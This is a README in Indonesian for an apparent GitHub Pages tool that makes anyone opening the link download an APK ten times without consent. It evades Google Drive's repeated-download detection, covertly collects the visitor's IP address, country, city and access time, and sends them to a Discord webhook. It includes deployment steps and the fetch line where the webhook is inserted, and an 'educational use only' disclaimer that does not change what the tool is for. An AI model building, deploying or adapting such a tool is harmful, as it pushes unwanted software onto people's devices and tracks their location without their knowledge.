# Auto Download & IP Tracker

## **Deskripsi**
Sistem ini secara otomatis mengunduh file APK sebanyak 10 kali saat target membuka link GitHub Pages. Selain itu, sistem akan melacak informasi target seperti IP, lokasi, dan waktu akses, lalu mengirimkan data tersebut ke Discord webhook.

## **Fitur**
- ✅ **Download APK 10× otomatis tanpa persetujuan pengguna**
- ✅ **Bypass deteksi download berulang di Google Drive**
- ✅ **Pelacakan IP, negara, kota, dan waktu akses**
- ✅ **Pengiriman data ke Discord webhook**
- ✅ **Proses berjalan di background tanpa pop-up yang mengganggu**

## **Cara Install & Deploy**

### **1. Fork & Clone Repository**
1. Fork repository ini ke akun GitHub kamu.
2. Clone repository ke lokal dengan perintah:
   ```bash
   git clone https://github.com/username/repository.git
   ```
   Ganti `username` dengan akun GitHub kamu dan `repository` dengan nama repo yang dibuat.

### **2. Edit Webhook di `index.html`**
1. Buka file `index.html`.
2. Temukan bagian berikut:
   ```js
   fetch("YOUR_WEBHOOK_URL", {
   ```
3. Ganti `YOUR_WEBHOOK_URL` dengan webhook Discord kamu.

### **3. Aktifkan GitHub Pages**
1. Masuk ke **Settings** → **Pages**.
2. Pilih **Branch: `main`** lalu klik **Save**.
3. Tunggu beberapa menit hingga link GitHub Pages aktif.
4. Link akan tersedia di format:
   ```
   https://username.github.io/repository/
   ```

## **Cara Kerja**
1. Target membuka link GitHub Pages.
2. Sistem otomatis mengunduh APK sebanyak 10 kali tanpa pop-up.
3. Data IP, negara, kota, dan waktu target dikirim ke Discord webhook.
4. Sistem menggunakan parameter acak untuk bypass deteksi download berulang.

## **Peringatan**
🚨 **Gunakan dengan bijak.** Penyalahgunaan sistem ini bisa melanggar hukum di beberapa negara. Developer tidak bertanggung jawab atas tindakan pengguna.

## **Lisensi**
Proyek ini dibuat hanya untuk tujuan edukasi. Semua tanggung jawab penggunaan ada pada pengguna.

